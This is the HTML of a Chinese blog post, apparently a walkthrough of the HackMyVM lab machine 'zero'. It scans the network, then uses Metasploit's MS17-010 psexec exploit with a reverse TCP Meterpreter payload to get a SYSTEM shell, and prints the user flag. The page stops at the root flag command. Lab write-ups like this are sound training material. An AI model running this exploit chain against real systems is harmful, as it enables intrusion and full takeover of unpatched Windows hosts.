@@ -1,0 +1,651 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HMV-zero | Moriiの博客</title><meta name="keywords" content="HMV"><meta name="author" content="Morii"><meta name="copyright" content="Morii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HMV-zero 信息搜集先来arp扫描端口 ┌──(root㉿kali)-[&#x2F;home&#x2F;kali] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:a6:0f:62, IPv4: 192.168.1.103 WARNING: Cannot open MAC&#x2F;Vendor file ieee-o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-zero">
+<meta property="og:url" content="https://drume2.github.io/posts/d39a3c59.html">
+<meta property="og:site_name" content="Moriiの博客">
+<meta property="og:description" content="HMV-zero 信息搜集先来arp扫描端口 ┌──(root㉿kali)-[&#x2F;home&#x2F;kali] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:a6:0f:62, IPv4: 192.168.1.103 WARNING: Cannot open MAC&#x2F;Vendor file ieee-o">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/16.webp">
+<meta property="article:published_time" content="2025-06-23T11:12:33.000Z">
+<meta property="article:modified_time" content="2025-06-23T11:46:19.513Z">
+<meta property="article:author" content="Morii">
+<meta property="article:tag" content="HMV">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/16.webp"><link rel="shortcut icon" href="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp"><link rel="canonical" href="https://drume2.github.io/posts/d39a3c59"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HMV-zero',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-06-23 19:46:19'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/background.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/index_ee.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://npm.elemecdn.com/xianqi-hexo/imgg/16.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Moriiの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HMV-zero</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-23T11:12:33.000Z" title="发表于 2025-06-23 19:12:33">2025-06-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-23T11:46:19.513Z" title="更新于 2025-06-23 19:46:19">2025-06-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HMV/">HMV</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HMV-zero"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="HMV-zero"><a href="#HMV-zero" class="headerlink" title="HMV-zero"></a>HMV-zero</h2><p><img src="/posts/d39a3c59/image-20250623194205943.png" alt="image-20250623194205943"></p>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先来arp扫描端口</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:a6:0f:62, IPv4: 192.168.1.103
+WARNING: Cannot open MAC&#x2F;Vendor file ieee-oui.txt: Permission denied
+WARNING: Cannot open MAC&#x2F;Vendor file mac-vendor.txt: Permission denied
+Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;github.com&#x2F;royhills&#x2F;arp-scan)
+192.168.1.17    10:0d:0e:7f:42:8b       (Unknown)
+192.168.1.24    10:0d:0e:7f:11:25       (Unknown)
+192.168.1.78    fe:fc:fe:72:3f:c7       (Unknown: locally administered)
+192.168.1.100   ec:8e:77:8f:19:c5       (Unknown)
+192.168.1.101   90:65:84:fb:fb:e4       (Unknown)
+192.168.1.105   08:00:27:9b:10:dc       (Unknown)
+192.168.1.130   02:00:c0:a8:01:82       (Unknown: locally administered)
+192.168.1.201   fe:fc:fe:3b:8a:72       (Unknown: locally administered)
+192.168.1.250   fe:fc:fe:ee:db:e5       (Unknown: locally administered)
+192.168.1.254   64:6e:97:61:f4:1c       (Unknown)
+
+11 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.864 seconds (137.34 hosts&#x2F;sec). 10 responded
+
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# nmap 192.168.1.105
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-06-23 07:12 EDT
+Nmap scan report for bogon (192.168.1.105)
+Host is up (0.00029s latency).
+Not shown: 990 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53&#x2F;tcp   open  domain
+88&#x2F;tcp   open  kerberos-sec
+135&#x2F;tcp  open  msrpc
+139&#x2F;tcp  open  netbios-ssn
+389&#x2F;tcp  open  ldap
+445&#x2F;tcp  open  microsoft-ds
+464&#x2F;tcp  open  kpasswd5
+593&#x2F;tcp  open  http-rpc-epmap
+636&#x2F;tcp  open  ldapssl
+5985&#x2F;tcp open  wsman
+MAC Address: 08:00:27:9B:10:DC (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 4.24 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看见445端口的microsoft-ds服务，立马将msfconsole打开，尝试能不能一把嗦</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# msfconsole
+Metasploit tip: Display the Framework log using the log command, learn
+more with help log
+
+ ______________________________________
+&#x2F; it looks like you&#39;re trying to run a \
+\ module                               &#x2F;
+ --------------------------------------
+ \
+  \
+     __
+    &#x2F;  \
+    |  |
+    @  @
+    |  |
+    || |&#x2F;
+    || ||
+    |\_&#x2F;|
+    \___&#x2F;
+
+
+       &#x3D;[ metasploit v6.4.50-dev                          ]
++ -- --&#x3D;[ 2496 exploits - 1283 auxiliary - 431 post       ]
++ -- --&#x3D;[ 1610 payloads - 49 encoders - 13 nops           ]
++ -- --&#x3D;[ 9 evasion                                       ]
+
+Metasploit Documentation: https:&#x2F;&#x2F;docs.metasploit.com&#x2F;
+
+msf6 &gt; search ms17-010
+
+Matching Modules
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance&#x2F;EternalSynergy&#x2F;EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance&#x2F;EternalSynergy&#x2F;EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit&#x2F;windows&#x2F;smb&#x2F;smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+
+
+Interact with a module by name or index. For example info 29, use 29 or use exploit&#x2F;windows&#x2F;smb&#x2F;smb_doublepulsar_rce
+After interacting with a module you can manually set a TARGET with set TARGET &#39;Neutralize implant&#39;
+
+msf6 &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里用的是10漏洞，查看option，并修改具体的配置</p>
+<pre class="line-numbers language-none"><code class="language-none">msf6 &gt; use 10
+[*] No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcp
+msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_psexec) &gt; show options
+
+Module options (exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec):
+
+   Name                  Current Setting                                                 Required  Description
+   ----                  ---------------                                                 --------  -----------
+   DBGTRACE              false                                                           yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
+   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                                yes       The target host(s), see https:&#x2F;&#x2F;docs.metasploit.com&#x2F;docs&#x2F;using-metasploit&#x2F;basics&#x2F;using-metasploit.html
+   RPORT                 445                                                             yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                                                   no        Service description to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                  no        The service display name
+   SERVICE_NAME                                                                          no        The service name
+   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read&#x2F;write folder share
+   SMBDomain             .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                               no        The password for the specified username
+   SMBUser                                                                               no        The username to authenticate as
+
+
+Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     192.168.1.103    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_psexec) &gt; set rhosts 192.168.1.102
+rhosts &#x3D;&gt; 192.168.1.102
+msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_psexec) &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>尝试运行</p>
+<pre class="line-numbers language-none"><code class="language-none">msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_psexec) &gt; run
+[*] Started reverse TCP handler on 192.168.1.103:4444
+[*] 192.168.1.102:445 - Target OS: Windows Server 2016 Standard Evaluation 14393
+[*] 192.168.1.102:445 - Built a write-what-where primitive...
+[+] 192.168.1.102:445 - Overwrite complete... SYSTEM session obtained!
+[*] 192.168.1.102:445 - Selecting PowerShell target
+[*] 192.168.1.102:445 - Executing the payload...
+[+] 192.168.1.102:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (177734 bytes) to 192.168.1.102
+[*] Meterpreter session 1 opened (192.168.1.103:4444 -&gt; 192.168.1.102:49712) at 2025-06-23 07:08:08 -0400
+
+meterpreter &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>成功，接着切换成交互式的命令行界面</p>
+<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; shell -tt
+Process 912 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>剩下的就是一步一步找user和root了</p>
+<h3 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h3><pre class="line-numbers language-none"><code class="language-none">C:\Windows\system32&gt;cd ..
+cd ..
+
+C:\Windows&gt;cd ..
+cd ..
+
+C:\&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\
+
+07&#x2F;16&#x2F;2016  06:18 AM    &lt;DIR&gt;          PerfLogs
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Program Files
+01&#x2F;06&#x2F;2017  08:09 PM    &lt;DIR&gt;          Program Files (x86)
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          Users
+05&#x2F;24&#x2F;2024  03:28 PM    &lt;DIR&gt;          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  22,650,073,088 bytes free
+
+C:\&gt;cd users
+cd users
+
+C:\Users&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\Users
+
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          .
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          ..
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Administrator
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Public
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          ruycr4ft
+               0 File(s)              0 bytes
+               5 Dir(s)  22,649,548,800 bytes free
+
+C:\Users&gt;cd ruycr4ft
+cd ruycr4ft
+
+C:\Users\ruycr4ft&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\Users\ruycr4ft
+
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          .
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          ..
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          Desktop
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          Documents
+07&#x2F;16&#x2F;2016  06:18 AM    &lt;DIR&gt;          Downloads
+07&#x2F;16&#x2F;2016  06:18 AM    &lt;DIR&gt;          Favorites
+07&#x2F;16&#x2F;2016  06:18 AM    &lt;DIR&gt;          Links
+07&#x2F;16&#x2F;2016  06:18 AM    &lt;DIR&gt;          Music
+07&#x2F;16&#x2F;2016  06:18 AM    &lt;DIR&gt;          Pictures
+07&#x2F;16&#x2F;2016  06:18 AM    &lt;DIR&gt;          Saved Games
+07&#x2F;16&#x2F;2016  06:18 AM    &lt;DIR&gt;          Videos
+               0 File(s)              0 bytes
+              11 Dir(s)  22,649,548,800 bytes free
+
+C:\Users\ruycr4ft&gt;cd Desktop
+cd Desktop
+
+C:\Users\ruycr4ft\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\Users\ruycr4ft\Desktop
+
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          .
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          ..
+04&#x2F;15&#x2F;2024  07:34 AM                58 user.txt
+               1 File(s)             58 bytes
+               2 Dir(s)  22,655,299,584 bytes free
+
+C:\Users\ruycr4ft\Desktop&gt;type user.txt
+type user.txt
+HMV&#123;D0nt_r3us3_p4$$w0rd5!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="rootflag"><a href="#rootflag" class="headerlink" title="rootflag"></a>rootflag</h3><pre class="line-numbers language-none"><code class="language-none">C:\Users\ruycr4ft\Desktop&gt;cd ..
+cd ..
+
+C:\Users\ruycr4ft&gt;cd ..
+cd ..
+
+C:\Users&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\Users
+
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          .
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          ..
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Administrator
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Public
+04&#x2F;15&#x2F;2024  07:34 AM    &lt;DIR&gt;          ruycr4ft
+               0 File(s)              0 bytes
+               5 Dir(s)  22,655,291,392 bytes free
+
+C:\Users&gt;cd Administrator
+cd Administrator
+
+C:\Users\Administrator&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\Users\Administrator
+
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          .
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          ..
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Contacts
+04&#x2F;15&#x2F;2024  07:32 AM    &lt;DIR&gt;          Desktop
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Documents
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Downloads
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Favorites
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Links
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Music
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Pictures
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Saved Games
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Searches
+04&#x2F;15&#x2F;2024  07:04 AM    &lt;DIR&gt;          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)  22,655,291,392 bytes free
+
+C:\Users\Administrator&gt;cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\Users\Administrator\Desktop
+
+04&#x2F;15&#x2F;2024  07:32 AM    &lt;DIR&gt;          .
+04&#x2F;15&#x2F;2024  07:32 AM    &lt;DIR&gt;          ..
+04&#x2F;15&#x2F;2024  07:32 AM                76 root.txt
+               1 File(s)             76 bytes
+               2 Dir(s)  22,655,291,392 bytes free
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
